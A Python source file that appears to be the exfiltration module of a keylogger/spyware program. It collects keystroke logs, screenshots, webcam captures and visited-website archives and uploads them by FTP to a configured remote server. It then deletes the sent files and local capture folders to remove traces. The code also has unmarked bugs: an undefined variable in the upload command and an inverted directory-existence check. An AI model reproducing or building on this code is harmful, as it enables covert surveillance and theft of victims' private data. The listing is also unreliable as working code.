import ftplib
import os
from getsqldata import *
from datetime import datetime


def uploadFileFTP(sourceFilePath, destinationDirectory, server, username, password):
    myFTP = ftplib.FTP(server, username, password)
    if destinationDirectory in [name for name, data in list(myFTP.mlsd())]:
        print("Destination Directory does not exist. Creating it first")
        myFTP.mkd(destinationDirectory)
    # Changing Working Directory
    myFTP.cwd(destinationDirectory)
    if os.path.isfile(sourceFilePath):
        fh = open(sourceFilePath, 'rb')
        myFTP.storbinary('STOR %s' % f, fh)
        fh.close()
    else:
        print("Source File does not exist")

def DelSentLogs(files):
    for f in files:
        if(os.path.exists(f)):
            os.remove(f)
            
def DelCurrLogs(pathDir):
    if(os.path.exists(pathDir)):
        for i in os.listdir(pathDir):
            os.remove(os.path.join(pathDir, i))
    
def TotalFileSize(arr_file):
    size = 0
    for f in arr_file:
        if(os.path.exists(f)):
            size = size + os.path.getsize(f)
    return size >> 10

uid = getCurrentUser()
sv = getRowValue('FTPServer',uid)
conf = getRowValue('FTP',uid)

size = conf[9]
enSize = conf[8]

#print(sv)
keystrokeLogs = datetime.now().strftime('%Y_%m_%d')+'.txt'

dir_path = getRowValue('Setting',uid) # thu muc chua file can gui
# cac file can gui
files = []
if (conf[4] == 1):
    files.append(os.path.join(dir_path[1],keystrokeLogs))
if (conf[5] == 1):
    files.append(os.path.join(dir_path[3],"Screenshot.zip"))
if (conf[6] == 1):
    files.append(os.path.join(dir_path[2],"Webcam.zip"))
if (conf[7] == 1):
    files.append(os.path.join(dir_path[5],"Website.zip"))
    
try:
    success = 0
    if(enSize == 1 and TotalFileSize(files) > size):
        for f in files:  # add files to the message
            #file_path = os.path.join(dir_path, f)
            if (os.path.exists(f)):
                uploadFileFTP(f,sv[4],sv[1],sv[2],sv[3])
                print("Upload "+ str(f) + " sucessful!")
            else:
                print(str(f) + " does not exists!!!")
            success = 1
    elif(enSize == 0 and conf[1] == 1):
        for f in files:  # add files to the message
            #file_path = os.path.join(dir_path, f)
            if (os.path.exists(f)):
                uploadFileFTP(f,sv[4],sv[1],sv[2],sv[3])
                print("Upload "+ str(f) + " sucessful!")
            else:
                print(str(f) + " does not exists!!!")
        success = 1

    if (success == 1):
        wc = getRowValue("Webcam",uid)
        if(conf[10] == 1):
            # delete sent log
            DelSentLogs(files)
            print("Del sent logs ok")
            # delete exists log in folder
            DelCurrLogs(os.path.join(dir_path[2],"Webcam"))   
            DelCurrLogs(os.path.join(dir_path[3],"Screenshot"))
            DelCurrLogs(os.path.join(dir_path[5],"Website"))
            print("Del log in folder ok")
        elif(wc[7] == 1):
            # if email not set delete after upload successful,
            # check in webcam to delete
            DelCurrLogs(os.path.join(dir_path[2],"Webcam"))
            print("Del webcam logs ok")

            
except Exception as e:
    print("Error : " + str(e))
